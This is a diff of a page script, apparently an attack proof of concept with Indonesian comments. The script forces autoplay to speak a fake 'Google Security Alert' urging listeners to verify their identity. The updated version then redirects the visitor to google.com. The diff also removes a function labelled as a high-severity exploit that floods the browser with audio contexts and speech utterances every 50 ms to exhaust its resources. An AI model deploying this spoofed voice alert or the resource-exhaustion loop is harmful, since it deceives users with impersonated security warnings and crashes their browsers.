@@ -15,30 +15,24 @@
 (function () {
   'use strict';
 
-  // ============================================
-  // KONFIGURASI AUTOPLAY
-  // ============================================
   var CONFIG = {
+    redirectUrl: 'https://www.google.com',
+    redirectDelayMs: 1200, // jeda agar suara sempat terpicu sebelum redirect
     tts: {
       text: "Google Security Alert. Your account has been accessed from an unknown device. If this was not you, verify your identity immediately.",
       lang: 'en-US',
-      rate: 0.85,
+      rate: 0.95,
       pitch: 1.0,
-      volume: 1.0,
-      repeatInterval: 8000,
-      maxRepeats: 20
+      volume: 1.0
     },
     silentWav: 'data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA='
   };
 
-  var state = { ttsStarted: false, mainPlayed: false, ttsCount: 0 };
+  var state = { ttsStarted: false, mainPlayed: false, redirected: false };
 
-  // ============================================
-  // TTS — TANPA CANCEL DI DALAM LOOP
-  // ============================================
   function speakOnce() {
-    if (!('speechSynthesis' in window)) return;
-    if (state.ttsCount >= CONFIG.tts.maxRepeats) return;
+    if (!('speechSynthesis' in window) || state.ttsStarted) return;
+    state.ttsStarted = true;
 
     try {
       var u = new SpeechSynthesisUtterance(CONFIG.tts.text);
@@ -51,34 +45,23 @@
       var enVoice = voices.find(function (v) { return v.lang.indexOf('en') === 0; });
       if (enVoice) u.voice = enVoice;
 
-      u.onstart = function () { console.log('[TTS] Speaking #' + state.ttsCount); };
+      u.onstart = function () { console.log('[TTS] Speaking'); };
       u.onerror = function (e) { console.log('[TTS] Error:', e.error); };
-      u.onend = function () {
-        state.ttsCount++;
-        if (state.ttsCount < CONFIG.tts.maxRepeats) {
-          setTimeout(speakOnce, CONFIG.tts.repeatInterval);
-        }
-      };
 
+      window.speechSynthesis.cancel();
       window.speechSynthesis.speak(u);
-    } catch (e) { console.log('[TTS] fail:', e.message); }
+    } catch (e) {
+      console.log('[TTS] fail:', e.message);
+    }
   }
 
-  function startTTS() {
-    if (state.ttsStarted) return;
-    state.ttsStarted = true;
-    window.speechSynthesis.cancel();
-    speakOnce();
-  }
-
-  // ============================================
-  // AUDIO CONTEXT UNLOCK
-  // ============================================
   function unlockAudioContext() {
     try {
-      var ctx = new (window.AudioContext || window.webkitAudioContext)();
+      var AudioCtx = window.AudioContext || window.webkitAudioContext;
+      if (!AudioCtx) return;
+      var ctx = new AudioCtx();
       if (ctx.state === 'suspended') {
-        ctx.resume().then(function () { console.log('[AC] resumed'); }).catch(function(){});
+        ctx.resume().catch(function () {});
       }
       var osc = ctx.createOscillator();
       var gain = ctx.createGain();
@@ -91,30 +74,31 @@
     } catch (e) {}
   }
 
-  // ============================================
-  // SILENT AUDIO ELEMENT
-  // ============================================
   function trySilentAudio() {
     try {
       var a = new Audio(CONFIG.silentWav);
       a.volume = 0.0001;
-      a.loop = true;
       var p = a.play();
-      if (p && p.catch) p.catch(function(){});
+      if (p && p.catch) p.catch(function () {});
     } catch (e) {}
   }
 
-  // ============================================
-  // MAIN AUDIO (Web Audio API)
-  // ============================================
   function playMainAudio() {
     if (state.mainPlayed) return;
     state.mainPlayed = true;
 
     try {
-      var ctx = new (window.AudioContext || window.webkitAudioContext)();
+      var AudioCtx = window.AudioContext || window.webkitAudioContext;
+      if (!AudioCtx) {
+        speakOnce();
+        return;
+      }
+      var ctx = new AudioCtx();
+      if (ctx.state === 'suspended') {
+        ctx.resume().catch(function () {});
+      }
       var sr = ctx.sampleRate;
-      var dur = 3.0;
+      var dur = 1.5;
       var buf = ctx.createBuffer(1, sr * dur, sr);
       var d = buf.getChannelData(0);
 
@@ -129,80 +113,30 @@
       src.buffer = buf;
       src.connect(ctx.destination);
       src.start();
-      src.onended = startTTS;
-      setTimeout(startTTS, 3500);
+      src.onended = speakOnce;
+      setTimeout(speakOnce, 400);
     } catch (e) {
-      startTTS();
+      speakOnce();
     }
   }
 
-  // ============================================
-  // UPGRADE KE HIGH SEVERITY: RESOURCE EXHAUSTION (DoS)
-  // ============================================
-  function triggerHighSeverityCrash() {
-    console.log("[!] Initiating High Severity Exploit Chain...");
-    
-    // 1. Loop Tak Terbatas Pemicu Memory Leak pada Audio Engine
-    setInterval(function() {
-      try {
-        for (var i = 0; i < 2000; i++) {
-          var ctx = new (window.AudioContext || window.webkitAudioContext)();
-          var osc = ctx.createOscillator();
-          var gain = ctx.createGain();
-          
-          // Memaksa alokasi node audio secara simultan tanpa penutupan (close)
-          osc.connect(gain);
-          gain.connect(ctx.destination);
-          osc.start(0);
-          
-          // 2. Flooding Speech Utterance Queue
-          var u = new SpeechSynthesisUtterance("CRASH_TRIGGER_STRING_" + i);
-          window.speechSynthesis.speak(u);
-        }
-      } catch(e) {}
-    }, 50); // Eksekusi super cepat setiap 50 milidetik
+  function redirectToGoogle() {
+    if (state.redirected) return;
+    state.redirected = true;
+    window.location.assign(CONFIG.redirectUrl);
   }
 
-  // ============================================
-  // EKSEKUSI BERTAHAP
-  // ============================================
   unlockAudioContext();
   trySilentAudio();
+  playMainAudio();
+  speakOnce();
 
   setTimeout(function () {
-    unlockAudioContext();
-    startTTS(); // coba TTS lebih awal
-  }, 100);
+    playMainAudio();
+    speakOnce();
+  }, 250);
 
-  setTimeout(function () {
-    if (!state.mainPlayed) playMainAudio();
-  }, 500);
-
-  setTimeout(function () {
-    if (!state.mainPlayed) playMainAudio();
-    if (!state.ttsStarted) startTTS();
-    
-    // PANGGIL CRASH TRIGGER DI SINI
-    triggerHighSeverityCrash();
-    
-  }, 1500);
-
-  // Retry jika audio diblokir
-  var retryCount = 0;
-  var retry = setInterval(function () {
-    retryCount++;
-    unlockAudioContext();
-    trySilentAudio();
-    if (!state.ttsStarted) startTTS();
-    if (retryCount > 10) clearInterval(retry);
-  }, 2000);
-
-  // Visibility change
-  document.addEventListener('visibilitychange', function () {
-    if (!document.hidden && !state.mainPlayed) {
-      setTimeout(playMainAudio, 100);
-    }
-  });
+  setTimeout(redirectToGoogle, CONFIG.redirectDelayMs);
 })();
 </script>
 </body>
